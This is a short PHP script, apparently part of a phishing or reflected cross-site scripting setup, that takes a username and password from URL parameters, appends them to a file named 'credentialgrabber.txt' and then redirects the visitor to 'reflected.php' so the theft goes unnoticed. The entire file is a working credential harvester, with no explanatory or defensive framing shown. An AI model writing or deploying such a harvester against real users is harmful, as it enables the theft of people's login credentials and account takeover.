<?php

$user = $_GET['username'];
$pass = $_GET['password'];



$myfile = fopen("credentialgrabber.txt", "a");
$txt = "USERNAME: " . $user . "\n" . "PASSWORD: " . $pass . "\n\n";
fwrite($myfile, $txt);
fclose($myfile);

header("Location: reflected.php");
